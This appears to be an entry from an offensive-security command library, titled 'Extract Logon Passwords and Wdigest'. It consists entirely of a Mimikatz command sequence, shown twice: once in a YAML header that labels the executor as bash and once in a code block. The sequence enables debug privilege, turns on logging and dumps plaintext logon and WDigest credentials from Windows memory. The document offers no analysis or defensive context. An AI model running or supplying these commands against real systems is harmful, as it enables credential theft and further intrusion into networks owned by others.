---
id: 42bb96b1-9c7d-464b-8e68-9191c2fbc491
name: Extract Logon Passwords and Wdigest
type: command
executor: bash
data: '.\mimikatz

  privilege::debug

  log

  sekurlsa::logonpasswords

  sekurlsa::wdigest'
output: null
created_at: '2023-04-06T03:56:27.080443+00:00'
updated_at: '2023-04-10T20:37:17.351681+00:00'
---

# Extract Logon Passwords and Wdigest

```bash
.\mimikatz
privilege::debug
log
sekurlsa::logonpasswords
sekurlsa::wdigest
```


